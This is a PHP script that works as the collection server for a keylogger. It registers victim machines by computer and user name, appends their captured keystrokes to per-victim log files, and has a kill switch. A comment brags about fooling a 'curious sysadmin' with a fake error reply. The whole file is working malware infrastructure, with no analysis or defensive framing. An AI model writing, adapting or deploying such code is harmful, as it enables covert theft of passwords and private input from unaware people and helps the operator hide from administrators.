<?php

# Set an token's filename to "terminate" to kill an keylogger

$fileNamePrefix = "keylog_";
$cacheFileName = "tokenFilenames.json";

$fileNames = array(""=>"");
$cacheContent = file_get_contents($cacheFileName);
$fileNames = json_decode($cacheContent, true);

switch ($_GET['type'])
{
    case "key":
        $token = $_GET['token'];
        $fileName = $fileNames[$token];
        if ($fileName == "terminate")
        {
            echo "die";
            die;
        }
        file_put_contents($fileName, base64_decode($_GET['key']), FILE_APPEND);
        echo "ok";
        break;
    case "":
        # Yeah, we've got the curious sysadmin covered
        echo '{"state":"error","msg":"Bad request"}';
        break;
    default:
        $token = uniqid();
        $fileName = $fileNamePrefix . base64_decode($_GET['computer']) . "-" . base64_decode($_GET['user']) .
            "-" . time() . ".txt";
        $fileNames[$token] = $fileName;
        file_put_contents($cacheFileName, json_encode($fileNames));
        file_put_contents($fileName, "Token: " . $token . "\n\n");
        echo $token;
}
?>